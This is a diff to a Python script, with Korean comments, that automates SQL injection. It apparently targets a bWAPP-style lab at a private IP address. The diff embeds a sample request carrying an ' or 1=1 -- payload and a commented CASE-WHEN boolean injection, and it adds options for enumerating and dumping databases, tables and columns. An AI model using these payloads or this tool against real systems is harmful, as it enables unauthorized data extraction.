@@ -1,7 +1,9 @@
 ####################
+# 추가로 만들 옵션
 # 1. Request 입력한 파일 값 받아오기
 # 2. DB, TABLE, COLUMN 외 데이터 출력 구현
 # 3. 다른 데이터베이스 페이로드 생성 # !! MYSQL, ORACLE 완료
+# 4. --dump 덤프 옵션 추가
 ####################
 
 # -*- coding: utf-8 -*-   
@@ -12,6 +14,7 @@ import requests
 import warnings
 import argparse
 import sqlite3
+
 warnings.filterwarnings('ignore')
 
 # 전역변수
@@ -19,8 +22,23 @@ output_check = False
 args = None
 true_message_size = None # 참(ture)의 경우 message size
 
-
-############# GET request 예시 ###############
+########################################################################################################
+############## GET request 예시 ###############
+REQUEST_STRING = """
+GET /?username=aa'+or+1=1+--+&password=1234 HTTP/1.1
+Host: 192.168.219.100:5001
+Cache-Control: max-age=0
+Accept-Language: ko-KR,ko;q=0.9
+Origin: http://192.168.219.100:5001
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.219.100:5001/
+Accept-Encoding: gzip, deflate, br
+Cookie: security_level=0; PHPSESSID=8b9bc69d316ada9443e502f798cdb748
+Connection: keep-alive
+"""
+############ POST request 예시 ###############
 # REQUEST_STRING = """
 # POST / HTTP/1.1
 # User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
@@ -36,22 +54,9 @@ true_message_size = None # 참(ture)의 경우 message size
 
 # username='%7C%7C(case+when+1=1+then+'kazal92'+else+'test'+end)%7C%7C'&password=1234
 # """
+########################################################################################################
 
 
-############## GET request 예시 ###############
-REQUEST_STRING = """
-GET /?username=aa'+or+1=1+--+&password=1234 HTTP/1.1
-Host: 192.168.219.100:5001
-Cache-Control: max-age=0
-Accept-Language: ko-KR,ko;q=0.9
-Origin: http://192.168.219.100:5001
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://192.168.219.100:5001/
-Accept-Encoding: gzip, deflate, br
-Cookie: security_level=0; PHPSESSID=8b9bc69d316ada9443e502f798cdb748
-Connection: keep-alive"""
 
 class Colors:
 	""" ANSI color codes """
@@ -98,23 +103,35 @@ class ArgumentProcessor:
 
 	def get_argument(self):
 		parser = argparse.ArgumentParser()
-		parser.add_argument("-s",dest="schema", help="http? https?")
-		parser.add_argument("-p", dest="parameter", help="target param")
-		parser.add_argument("-d", dest="result_db", help="Database name for storing results ex) -d result_db.db")
+		group = parser.add_mutually_exclusive_group(required=True)
+		
+		parser.add_argument("-s",dest="schema", help="http? https? EX) -s HTTP")
+		parser.add_argument("-p", dest="parameter", help="target param -EX title")
+		parser.add_argument("-d", dest="result_db", help="Database name for storing results EX) -d result_db.db")
+		parser.add_argument("-D", dest="select_db", help="select DB EX) -D bWAPP")
+		parser.add_argument("-T", dest="select_table", help="select Table EX) -T 'USERS', 'EXAMPLE_TABLE' # 싱글쿼터 없어도됨")
+		parser.add_argument("-C", dest="select_column", help="select Column EX) -C 'blog', 'heroes'# 싱글쿼터 없어도됨")
+		parser.add_argument("--dbms", dest="dbms", help="SELECT DBMS : MySQL, Oracle, MSSQL, PostgreSQL EX) oracle")
+		parser.add_argument("--proxy", dest="proxy", help="Use a proxy to connect to the target URL EX) 127.0.0.1:8080")
+		# parser.add_argument("--dump", dest="store_true", help="Dump database table entries # 데이터베이스 테이블 항목 덤프")
 
-		parser.add_argument("-D", dest="select_db", help="select DB")
-		parser.add_argument("-T", dest="select_table", help="select Table")
-		parser.add_argument("-C", dest="select_column", help="select Column")
-		parser.add_argument("--proxy", dest="proxy", help="Use a proxy to connect to the target URL")
-		parser.add_argument("--dbms", dest="dbms", help="SELECT DBMS : MySQL, Oracle, MSSQL, PostgreSQL")
-		parser.add_argument("--basic", action="store_true", help="Basic info extraction")
-		parser.add_argument("--dbs", action="store_true", help="Enumerate DBMS databases")
-		parser.add_argument("--tables", action="store_true", help="Enumerate Tables")
-		parser.add_argument("--columns", action="store_true", help="Enumerate columns")
+		group.add_argument("--basic", action="store_true", help="Basic info extraction")
+		group.add_argument("--dbs", action="store_true", help="Enumerate DBMS databases")
+		group.add_argument("--tables", action="store_true", help="Enumerate Tables")
+		group.add_argument("--columns", action="store_true", help="Enumerate columns")
 
 		options = parser.parse_args()
-		if not options.parameter or not options.schema: # 수정해야됨
-			parser.error("[-] Missing required parameters: --param, --schema are required. Use --help for more info.")
+		if not options.parameter:
+			parser.error("[-] Error: The -p parameter must be specified. Use --help for more information.")
+		if not options.schema:
+			parser.error("[-] Error: The -s schema must be specified. Use --help for more information.")
+		if not options.result_db:
+			parser.error("[-] Error: The -d option must specify the name of the database to store the results. Use --help for more information.")
+		if not options.dbms:
+			parser.error("[-] Error: The -D option must specify the name of the database to store the results. Use --help for more information.")
+		if not (options.basic or options.dbs or (options.tables and options.select_db) or (options.columns and options.select_db and options.select_table)):
+			parser.error("[-] Error: At least one of the following options must be specified: --basic, --dbs, --tables, --columns. Use --help for more information.")
+
 		return options
 
 class SQLiteProcessor:
@@ -165,7 +182,7 @@ def line_delete(req):
 		request_str = '\n' + request_str
 	
 	return request_str
-	
+
 def parse_request(request):
 	headers = {} # 헤더 딕셔너리
 	data = {} # GET 파라미터 딕셔너리
@@ -367,8 +384,6 @@ def connection(data, method, url, path, headers):
 	if true_message_size == check_message_size:
 		return 1    # true
 	return 0    # false
-
-
 
 def query_start():
 	row_count = 1 # 행 개수
